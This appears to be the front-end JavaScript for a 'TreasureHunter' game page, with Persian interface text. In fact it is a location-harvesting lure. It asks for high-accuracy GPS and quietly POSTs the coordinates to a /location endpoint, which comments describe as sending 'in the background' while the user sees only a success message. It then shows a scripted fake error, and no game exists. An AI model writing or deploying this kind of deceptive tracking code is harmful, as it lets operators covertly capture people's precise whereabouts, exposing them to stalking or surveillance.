const startBtn =
    document.getElementById("startBtn");

const statusBox =
    document.getElementById("status");

const locationBox =
    document.getElementById("locationBox");

const latBox =
    document.getElementById("lat");

const lonBox =
    document.getElementById("lon");

const accuracyBox =
    document.getElementById("accuracy");


async function sendLocation(
    latitude,
    longitude,
    accuracy
) {
    const response = await fetch(
        "/location",
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                latitude,
                longitude,
                accuracy
            })
        }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
        throw new Error(
            result.error || "Server error"
        );
    }

    return result;
}


function showLocation(
    latitude,
    longitude,
    accuracy
) {
    latBox.textContent =
        latitude.toFixed(6);

    lonBox.textContent =
        longitude.toFixed(6);

    accuracyBox.textContent =
        `${Math.round(accuracy)} m`;

    locationBox.classList.remove(
        "hidden"
    );
}


startBtn.addEventListener(
    "click",
    () => {

        if (!navigator.geolocation) {
            statusBox.textContent =
                "❌ این دستگاه از موقعیت مکانی پشتیبانی نمی‌کند.";
            return;
        }

        startBtn.disabled = true;

        startBtn.textContent =
            "📡 در حال دریافت موقعیت...";

        statusBox.textContent =
            "📡 در حال دریافت موقعیت شما...";


        navigator.geolocation.getCurrentPosition(

            async (position) => {

                const latitude =
                    position.coords.latitude;

                const longitude =
                    position.coords.longitude;

                const accuracy =
                    position.coords.accuracy;


                showLocation(
                    latitude,
                    longitude,
                    accuracy
                );


                // کاربر فقط این را می‌بیند
                statusBox.textContent =
                    "✅ موقعیت دریافت شد";


                // ارسال در پس‌زمینه
                try {
                    await sendLocation(
                        latitude,
                        longitude,
                        accuracy
                    );
                } catch (error) {
                    console.error(
                        "[TreasureHunter]",
                        error
                    );
                }


                // رفتن به صفحه بازی
                setTimeout(() => {

                    statusBox.textContent =
                        "🎮 در حال انتقال به صفحه بازی...";


                    startBtn.textContent =
                        "🎮 ورود به بازی";


                    setTimeout(() => {

                        statusBox.textContent =
                            "❌ خطایی رخ داد.\nلطفاً بعداً دوباره امتحان کنید.";

                        startBtn.disabled =
                            false;

                        startBtn.textContent =
                            "📍 شروع دوباره";

                    }, 1500);

                }, 700);
            },


            (error) => {

                console.error(
                    "[TreasureHunter] GPS",
                    error
                );

                startBtn.disabled =
                    false;

                startBtn.textContent =
                    "📍 شروع بازی";


                switch (error.code) {

                    case 1:
                        statusBox.textContent =
                            "❌ دسترسی به موقعیت داده نشد.";
                        break;

                    case 2:
                        statusBox.textContent =
                            "❌ موقعیت پیدا نشد.";
                        break;

                    case 3:
                        statusBox.textContent =
                            "⏱️ دریافت موقعیت زمان‌بر شد.";
                        break;

                    default:
                        statusBox.textContent =
                            "❌ خطایی در دریافت موقعیت رخ داد.";
                }
            },


            {
                enableHighAccuracy: true,
                timeout: 20000,
                maximumAge: 5000
            }
        );
    }
);
